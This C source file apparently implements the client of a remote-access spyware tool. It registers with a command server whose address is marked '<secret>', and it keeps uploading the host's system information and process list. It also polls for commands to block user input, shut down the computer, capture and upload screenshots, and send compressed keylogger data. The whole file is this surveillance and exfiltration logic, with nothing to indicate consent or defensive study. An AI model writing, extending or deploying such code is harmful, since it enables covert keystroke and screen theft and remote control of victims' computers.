#define _CRT_SECURE_NO_WARNINGS

#include "proxy_info.h"
#include "util.h"
#include "my_string.h"
#include "OSInfo.h"
#include "curlhelper.h"
#include "win_process.h"
#include "win_misc.h"
#include "formatter.h"
#include "myzip.h"
#include "thutil.h"
#include "keyboard_hook.h"
#include "file_util.h"
#include <cJSON.h>
#include <string.h>
#include <stdlib.h>



#define USE_LOCAL 1

#if USE_LOCAL
    #define PROXY_ADDR "127.0.0.1"
#else
    #define PROXY_ADDR "<secret>"
#endif

#define _STRINGIZE(value) #value

#define STRINGIZE(value) _STRINGIZE(value)

#define STRCAT(a, b) a ## b

#define BASE_ADDR() HTTP_SCHEME PROXY_ADDR PROXY_PORT





#define HTTP_OK             200
#define HTTP_NOT_MODIFIED   304
#define HTTP_INTERNAL       500
#define HTTP_NOT_FOUND      404
#define HTTP_NO_CONTENT     204


#define CMD_TURNOFF_COMP    0
#define CMD_TAKESCREEN      1
#define CMD_BLOCKINPUT      2
#define CMD_KB              3

#define     CMD_STATUS_PENDING      88  // remote control say that he wants to perform command
#define     CMD_STATUS_READYEXECUTE 89  // client is need to execute
#define     CMD_STATUS_FINISHED     90  // command has finished (but, we don't know in concrete)
#define     CMD_STATUS_SUCCESS      91  // command has executed successfully (means, received, understood and performed)
#define     CMD_STATUS_SYSTEM_ERROR 92  // system specific error occured (access denied, not found or any other) Win32, Linux


#define POLL_SUCCESS                        0
#define POLL_FAILED                         1
#define POLL_UNKNOWN                        2
#define POLL_FAILED_MESSAGE                 3
#define POLL_FAILED_INSUFFICENT_PRIVILEGES  4
#define POLL_FAILED_ALREADY_HAS_ERROR       5
#define POLL_FAILED_WIN32                   6

typedef int32_t poll_code_t;



POSInfo OSInfoFromJSON(const char * data)
{
    cJSON * obj = cJSON_Parse(data);
    cJSON * id_obj = cJSON_GetObjectItem(obj, "id");

    long id = (long)cJSON_GetNumberValue(id_obj);

    cJSON_Delete(obj);

    POSInfo info = AllocateAndInitializeOSInfo();

    info->ID = id;

    return info;
}

#undef USE_COUNTER

int PostOSInfo(void * ctx)
{
    HttpClient * http_client = NewSSLClient();

    long * id = ctx;
    char * url = StringFmt("%s/update_computer/%di", BASE_ADDR(), *id);

    HttpClientSetUrl(http_client, url);

    free(url);
    
    boolean error_occured = false;

    while (!error_occured)
    {
        POSInfo latest_info = GetLatestOsInfo();
        
        if (latest_info)
        {
            char * json = OSInfoToJson(latest_info);
            
            HttpClientSetDataSent(http_client, json, strlen(json), false);

            HttpClientPerform(http_client);

            long sc = HttpClientGetResponseCode(http_client);

            if (sc == HTTP_INTERNAL) {
                error_occured = true;
            }

            OSInfoFree(&latest_info);
            free(json);
            HttpClientResetBody(http_client);
        }
        
        ThreadSleepSeconds(SLEEP_SECONDS_DEFAULT);
    }

    HttpClientFree(http_client);
    
    return 0;
}



int PostProcesses(void * arg)
{
    HttpClient * http_client = NewSSLClient();
    long * client_id = arg;

    char * url = StringFmt("%s/update_processes/%di", BASE_ADDR(), *client_id);
    
    HttpClientSetUrl(http_client, url);

    free(url);

    boolean error_occured = false;
    int err_code = 0;
    while (!error_occured)
    {
        size_t count_process = 0;
        size_t allocated = 0;
        WinProcess * processes = RetrieveAllProcesses(&count_process, &allocated);
        if (processes && count_process > 0) {
            
            char * data = WinProcessToJson(processes, count_process);

            HttpClientSetDataSent(http_client, data, strlen(data), false);
            HttpClientPerform(http_client);

            long sc = HttpClientGetResponseCode(http_client);

            if (sc == HTTP_INTERNAL) {
                error_occured = true;
                err_code = -1;
                continue;
            }

            DestroyAllProcesses(processes, count_process);
            free(data);
            HttpClientResetBody(http_client);
        }

        ThreadSleepSeconds(SLEEP_SECONDS_DEFAULT);
    }

    HttpClientFree(http_client);

    return err_code;
}

typedef struct _cmd
{
    int cmd_type;
    int status;
    char * os_command;
    char * uri;

} command_t;

command_t * ParseCommand(const char * json)
{
    cJSON * obj = cJSON_Parse(json);

    if (!obj) {
        return NULL;
    }

    command_t * cmd = (command_t*)malloc(sizeof(command_t));
    memset(cmd, 0, sizeof(command_t));

    
    cmd->cmd_type = (int)cJSON_GetNumberValue(cJSON_GetObjectItem(obj, "cmd_type"));
    cmd->status = (int)cJSON_GetNumberValue(cJSON_GetObjectItem(obj, "status"));
    cmd->os_command = cJSON_GetStringValue(cJSON_GetObjectItem(obj, "os_command"));
    
    cJSON_Delete(obj);

    return cmd;
}

char * CommandToJSON(const command_t * value)
{
    cJSON * obj = cJSON_CreateObject();
    cJSON_AddNumberToObject(obj, "cmd_type", (double)value->cmd_type);
    cJSON_AddNumberToObject(obj, "status", (double)value->status);
    cJSON_AddStringToObject(obj, "os_command", value->os_command);

    char * data = cJSON_PrintUnformatted(obj);
    cJSON_Delete(obj);
    return data;
}

static const char * cmd_str(int cmd)
{
    switch (cmd)
    {
        case CMD_BLOCKINPUT: return "block input";
        case CMD_TAKESCREEN: return "take screenshot";
        case CMD_TURNOFF_COMP: return "turnoff computer";
    }

    return NULL;
}

boolean do_remove_command_for_client(int cmd)
{
    boolean result = false;
    HttpClient * http_client = NewSSLClient();
    
    char * url =       StringFmt("%s/remove_command/%dz", BASE_ADDR(), cmd);

    HttpClientSetUrl(http_client, url);
    HttpClientSetMethod(http_client, "DELETE");
    HttpClientPerform(http_client);

    long sc = HttpClientGetResponseCode(http_client);

    if (sc == HTTP_INTERNAL || sc == HTTP_NOT_FOUND)
    {
        goto cleanup;
    }

    result = true;

    goto cleanup;

    cleanup:
    {
        free(url);
        HttpClientFree(http_client);
        return result;
    }

}

boolean update_command(int cmd_type, int cmd_status)
{
    command_t cmd = {
        .cmd_type = cmd_type,
        .status = cmd_status,
        .os_command = NULL
        };
    
    boolean result = false;
    char * json = NULL;
    HttpClient * http_client = NewSSLClient();
    
    char * url =       StringFmt("%s/update_command/%dz", BASE_ADDR(), cmd_type);

    HttpClientSetUrl(http_client, url);
    HttpClientSetMethod(http_client, "POST");
    
    json = CommandToJSON(&cmd);
    
    HttpClientSetDataSent(http_client, json, strlen(json), false);
    
    
    HttpClientPerform(http_client);

    long sc = HttpClientGetResponseCode(http_client);
    

    if (sc == HTTP_INTERNAL || sc == HTTP_NOT_FOUND)
    {
        goto cleanup;
    }

    result = true;

    goto cleanup;

    cleanup:
    {
        free(url);
        free(json);
        HttpClientFree(http_client);
        return result;
    }



}



boolean check_command_already_failed(int cmd)
{
    HttpClient * http = NewSSLClient();
    char * url = StringFmt("%s/check_failure/%dz", BASE_ADDR(), cmd);
    HttpClientSetUrl(http, url);
    HttpClientSetHeadMethod(http);

    HttpClientPerform(http);

    boolean result = false;

    long sc = HttpClientGetResponseCode(http);

    if (sc == HTTP_OK)
    {
        result = true;
        goto clean;
    }


    clean:
    {
        HttpClientFree(http);
        free(url);
        return result;
    }
 
    goto clean;
}

#include <stdarg.h>

char * create_endpoint(const char * relative_format, ...)
{
    va_list ap;
    char * url;
    char * buf;


    va_start(ap, relative_format);
    buf = StringFmt(relative_format, va_arg(ap, void*));

    size_t s1 = sizeof(BASE_ADDR()) - 1;
    size_t s2 = strlen(buf);
    size_t s3 = s1 + s2 + 1;
    
    url = (char*)malloc(s3);
    (*url) = '\0';
    strcat(url, BASE_ADDR());
    strcat(url, buf);
    url[s3 - 1] = '\0';
    va_end(ap);
    free(buf);
    return url;
}

#define USE_DEFLATE 1

poll_code_t send_screenshot_to_server()
{
    poll_code_t code = POLL_FAILED;
    HttpClient * client = NULL;
    char * bmpImage, * url, * dataSend;
    size_t bmpImageSize = 0, dataSendSize = 0;
    
    bmpImage = NULL, url = NULL, dataSend = NULL;

    client = NewSSLClient();

    if (!client) {
        goto done;
    }

    bmpImage = CaptureScreen((size_t*)&bmpImageSize);

    if (!bmpImage) {
        goto done;
    }

    AddHeader(client, "Content-Type: image/bmp");

    #if USE_DEFLATE == 1
        dataSend = encode_deflate(bmpImage, bmpImageSize, &dataSendSize, Z_MAX);
        if (!dataSend) {
            goto done;
        }
        AddHeader(client, "Content-Encoding: deflate");
        free(bmpImage);
        bmpImage = NULL;
    #else
        dataSend = bmpImage;
        dataSendSize = bmpImageSize;
    #endif

    

    url = create_endpoint("/post_screen");

    if (!url) {
        goto done;
    }

    HttpClientSetUrl(client, url);
    

    HttpClientSetDataSent(client, dataSend, dataSendSize, false);

    HttpClientPerform(client);

    if (HttpClientHasError(client)) {
        goto done;
    }

    long sc = HttpClientGetResponseCode(client);

    if (sc == HTTP_OK) {
        code = POLL_SUCCESS;
    }

done:
    HttpClientFree(client);
    free(url);
    free(dataSend);
    return code;
}

int SendKeyboardData()
{
    HttpClient * http = NULL;
    fbuf_ptr buffer = NULL;
    char * endpoint = NULL;
    char * encoded = NULL;
    int sc;
    uint32_t encoded_size;
    poll_code_t code = POLL_FAILED;
    
    // reading keylog file
    buffer = ReadKeylog();

    if (!buffer) {
        goto done;
    }

    http = NewSSLClient();

    if (!http) {
        goto done;
    }


    encoded = encode_deflate(buffer->data, buffer->bytes, &encoded_size, Z_BALANCE);

    if (!encoded) {
        goto done;
    }

    HttpClientSetDataSent(http, encoded, encoded_size, false);
    
    endpoint = create_endpoint("/post_kbdata");
    
    if (!endpoint) {
        goto done;
    }

    HttpClientSetUrl(http, endpoint);
    HttpClientPerform(http);

    sc = HttpClientGetResponseCode(http);

    if (sc != HTTP_NO_CONTENT) {
        goto done;
    }

    code = POLL_SUCCESS;

done:
    fbuf_free(buffer);
    HttpClientFree(http);
    free(endpoint);
    free(encoded);
    return code;
}

poll_code_t do_poll(HttpClient * const http_client, const char * uri, int cmd)
{
    poll_code_t code = POLL_FAILED;
    command_t * command = NULL;

    HttpClientSetUrl(http_client, uri);
    HttpClientPerform(http_client);

    if (HttpClientHasError(http_client)) {
        code = POLL_FAILED;
        goto clean;
    }

    long sc = HttpClientGetResponseCode(http_client);

    if (sc == HTTP_INTERNAL || sc == HTTP_NOT_FOUND)
    {
        code = POLL_FAILED_MESSAGE;
        goto clean;
    }

    command = ParseCommand(HttpClientGetData(http_client));
    if (command->status == CMD_STATUS_READYEXECUTE)
    {
        printf("(poll) executing command: (%s) ...\n", cmd_str(cmd));
        switch (command->cmd_type)
        {
            case CMD_BLOCKINPUT:
            {
                BlockInputWin32(true);
                break;
            }
            case CMD_TAKESCREEN:
            {
                if (send_screenshot_to_server() == POLL_SUCCESS) {
                    printf("taken and sent screenshot!\n");
                }
                break;
            }
            case CMD_TURNOFF_COMP:
            {
                TurnComputerOffWin32();
                break;
            }
            case CMD_KB:
            {
                if (SendKeyboardData() == POLL_FAILED) {
                    printf("failed to send keyboard data ...\n");
                } else {
                    printf("keyboard data was sent to server!\n");
                }
                break;
            }
        }
    }

    if (HasErrorWin32())
    {
        char * message = FormatWinError(GetLastErrorWin32());
        printf("(poll) executing system command was failed: %s\n", message);
        
        FreeMessage(message);
        update_command(cmd, CMD_STATUS_SYSTEM_ERROR);
        
        code = POLL_FAILED_WIN32;
        goto clean;
    }

    if (check_command_already_failed(cmd)) {
        
        printf("(poll) specified command already has an error\n");
        code = POLL_FAILED_ALREADY_HAS_ERROR;
        goto clean;
    }
    
    if (update_command(cmd, CMD_STATUS_SUCCESS)) {
        code = POLL_SUCCESS;
        printf("(poll) was succeed (%s)\n", cmd_str(cmd));
    }

clean:
    {
        HttpClientResetBody(http_client);
        free(command);
        return code;
    }
}

int PollAboutCommand(void * arg)
{
    (void)arg;

    HttpClient * http_client = NULL;
    char * url_turnoff = NULL;
    char * url_take_screen = NULL;
    char * url_block_input = NULL;
    char * url_sendkb       = NULL;

    boolean error_occured = false;
    poll_code_t err_code = POLL_SUCCESS;


    http_client = NewSSLClient();
    url_turnoff =     create_endpoint("/poll_about_command/%dz", CMD_TURNOFF_COMP);
    url_take_screen = create_endpoint("/poll_about_command/%dz", CMD_TAKESCREEN);
    url_block_input = create_endpoint("/poll_about_command/%dz", CMD_BLOCKINPUT);
    url_sendkb      = create_endpoint("/poll_about_command/%dz", CMD_KB);

    while (!error_occured)
    {
        err_code = do_poll(http_client, url_turnoff, CMD_TURNOFF_COMP);
        err_code = do_poll(http_client, url_block_input, CMD_BLOCKINPUT);
        err_code = do_poll(http_client, url_take_screen, CMD_TAKESCREEN);
        err_code = do_poll(http_client, url_sendkb, CMD_KB);
        ThreadSleepSeconds(SLEEP_SECONDS_DEFAULT);
    }

    HttpClientFree(http_client);
    free(url_block_input);
    free(url_take_screen);
    free(url_turnoff);

    return err_code;
}


typedef struct client
{
    long id;
    char * remote_addr;
    char * desktop_name;
    time_t update_time;

} *pclient_t;


char * ClientToJSON(const pclient_t client)
{
    cJSON * obj = cJSON_CreateObject();
    cJSON_AddStringToObject(obj, "desktop_name", client->desktop_name);
    cJSON_AddNumberToObject(obj, "cl_id", client->id);
    cJSON_AddStringToObject(obj, "remote_addr", client->remote_addr);
    cJSON_AddNumberToObject(obj, "update_time", (double)client->update_time);

    char * data = cJSON_PrintUnformatted(obj);
    cJSON_Delete(obj);
    return data;
}

pclient_t ClientFromJSON(const char * data)
{
    cJSON * obj = cJSON_Parse(data);
    pclient_t client = (pclient_t)malloc(sizeof(struct client));

    client->id = (long)cJSON_GetNumberValue(cJSON_GetObjectItem(obj, "cl_id"));
    client->remote_addr = cJSON_GetStringValue(cJSON_GetObjectItem(obj, "remote_addr"));
    client->desktop_name = cJSON_GetStringValue(cJSON_GetObjectItem(obj, "desktop_name"));
    client->update_time = (long)cJSON_GetNumberValue(cJSON_GetObjectItem(obj, "update_time"));
    
    return client;
}

pclient_t ClientCreateNew(long id)
{
    pclient_t value = (pclient_t)malloc(sizeof(struct client));

    value->id = id;
    value->remote_addr = NULL;
    value->desktop_name = NULL;
    value->update_time = 0;

    return value;
}

void ClientFree(pclient_t value)
{
    if (value != NULL) {
        free(value->remote_addr);
        free(value->desktop_name);
    }
    
    free(value);
}


long ClientGetID(pclient_t v)
{
    return v->id;
}

pclient_t RegisterClient()
{
    HttpClient * http_client = NewSSLClient();

    struct client client = {0};

    client.desktop_name = GetDesktopName();
    client.id = ZERO;
    client.remote_addr = NULL;
    client.update_time = time(NULL);
    char * json = ClientToJSON(&client);

    char * url = StringFmt("%s/register_client",BASE_ADDR());
    HttpClientSetUrl(http_client, url);
    HttpClientSetDataSent(http_client, json, strlen(json), false);

    HttpClientPerform(http_client);
    
    long sc = HttpClientGetResponseCode(http_client);
    
    pclient_t added_client = NULL;
    
    if (sc == HTTP_OK)
    {
        added_client = ClientFromJSON(HttpClientGetData(http_client));
    }


    HttpClientFree(http_client);
    free(url);
    free(json);
    return added_client;
}


int ClientKeepAlive(void * ctx)
{
    pclient_t client = ctx;

    HttpClient * httpClient = NULL;
    char * url = NULL;
    boolean exec = true;

    httpClient = NewSSLClient();

    if (!httpClient) {
        goto done;
    }


    url = create_endpoint("/keep_alive");
    if (!url) {
        goto done;
    }

    HttpClientSetUrl(httpClient, url);

    while (exec)
    {
        client->update_time = time(NULL);
        char * json = ClientToJSON(client);

        if (json) {

            HttpClientSetDataSent(httpClient, json, strlen(json), false);
            HttpClientPerform(httpClient);

            if (HttpClientHasError(httpClient)) {
                exec = !exec;
            }

            HttpClientResetBody(httpClient);
            free(json);
        }

        ThreadSleepSeconds(SLEEP_SECONDS_MEDIUM);
    }

done:

    HttpClientFree(httpClient);
    free(url);
    return ZERO;
}